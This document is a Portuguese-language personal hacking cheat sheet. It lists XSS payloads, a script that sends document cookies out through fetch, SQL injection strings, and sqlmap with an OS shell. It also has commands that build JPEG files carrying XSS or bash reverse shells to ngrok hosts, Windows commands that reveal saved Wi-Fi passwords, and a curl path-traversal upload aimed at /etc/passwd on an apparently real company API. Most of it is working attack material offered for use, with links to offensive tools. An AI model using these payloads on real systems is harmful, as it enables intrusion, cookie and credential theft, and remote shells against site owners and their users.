# ANOTAÇÕES DE HACKING EM GERAL

### XSS

#### Paylod definitivo

```shell
"><svg/onload=confirm(1)>
```

#### Exfiltração de token e cookies por xss

```shell
python3 -m http.server 8000
<script>fetch('http://localhost:8000/' + document.cookie)</script>
```

### Links

[10K DE SENHAS MAIS COMUNS](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10k-most-common.txt)
[SHCHECK](https://github.com/santoru/shcheck)
[DORKS KING](https://dorkking.blindf.com/)
[ATTACK JWT TOKEN](https://github.com/ticarpi/jwt_tool)
[ATTACK JWT TOKEN](https://hub.docker.com/r/ticarpi/jwt_tool)
[PAYLOADS ALL THE THINGS](https://github.com/swisskyrepo/PayloadsAllTheThings)
[NOSQL](https://github.com/matrix/Burp-NoSQLiScanner)
[NOSQL](https://portswigger.net/web-security/nosql-injection)
[KEYHACKS VALIDAÇÃO DE API KEYS](https://github.com/streaak/keyhacks)
[RevShells](https://www.revshells.com/)
[Lista de assinaturas](https://en.wikipedia.org/wiki/List_of_file_signatures)
[Magic Bytes](https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198)
[NoSQLMap](https://github.com/codingo/NoSQLMap)
[NoSQLMap](https://medium.com/rangeforce/nosqlmap-a67d76b88c48)
[DeepSeek](https://github.com/deepseek-ai/DeepSeek-V3)
[NetExec](https://github.com/Pennyw0rth/NetExec)
[JShell](https://github.com/s0md3v/JShell)
[RegEx-DoS](https://github.com/jagracey/RegEx-DoS)

### CREATE XSS MALICIOUS JPG FILE

```shell
exiftool -Comment='<script>alert("XSS")</script>' pentester.jpg
```

### XSS BUTTON

```shell
<button onclick="alert('XSS')">Clique aqui</button>
```

### SQLMAP 

```shell
sqlmap -r request --tables --level 5 --risk 3 --random-agent --tamper=space2comment --os-shell
```

### CRIAR IMAGEM COM PAYLOAD XSS
##### Cria um arquivo de imagem JPEG com payload de xss em 

```shell
echo -e '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x01\x00\x01\x00\x00' > imagem_xss.jpeg
echo -e '<script>alert("XSS")</script>' >> imagem_xss.jpeg
```

### CRIAR IMAGEM COM REVERSE SHELL
### Cria um arquivo de imagem JPEG com um payload de reverse shell em bash

```shell
(echo -e '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x01\x00\x01\x00\x00'; echo -e '#!/bin/bash\nbash -i >& /dev/tcp/0.tcp.sa.ngrok.io/14498 0>&1') > imagem.jpeg
chmod +x imagem.jpeg
```

### SENHA WIRELESS (COMANDOS PARA WINDOWS)

```shell
netsh wlan show profile
netsh wlan show profile name=nomeRede key=clear
```

### SQL INJECTION

```shell
"
'
"'
" OR 1=1--
" OR 1=1#
" OR "1"="1
" OR "1"="1--
" OR "1"="1"--
" OR "1"="1#
" OR "1"="1"#
"+OR+1=1%23
"+OR+"1"="1
"+OR+"1"="1%23
"+OR+"1"="1"%23
"+OR+"1"="1%23
"+OR+"1"="1"%23
a")+OR+1=1%23
a")+OR+database()+like+'db_arch_m%'%23
a")+UNION+SELECT+*+FROM+usuarios+%23
a")ORDER+BY+158%23
a")+OR+cnes+like+'%%';%23
a")+OR+extractvalue(0x0a,version())%23
a")+UNION+(SELECT+1,1,1,1,1,1,version())%23
a") UNION (SELECT 1, version())#
a") UNION (SELECT 1, 1, version())#
a") UNION (SELECT 1, 1, 1, version())#
a") UNION (*)#
```

### CRIANDO REVERSE SHELL EM JAVASCRIPT EM UMA IMAGEM

```shell
echo "<script>require('child_process').exec('bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/18515 0>&1');</script>" >> pentester_2.jpg
```

```powershell
Add-Content -Path "imagem.jpg" -Value "<script>require('child_process').exec('bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/18515 0>&1');</script>"
```

```shell
exiftool -Comment="<script>require('child_process').exec('bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/18515');</script>" imagem.jpg
```

### UPLOAD FILE COM CURL

```shell
curl -X POST https://api.seniornortepr.com.br/sicredi/purchase-request-attachments/e83aad95-9ded-4abc-b5b7-ccac2c456496 | -F "file=@../../../../../../../../../../../etc/passwd"
```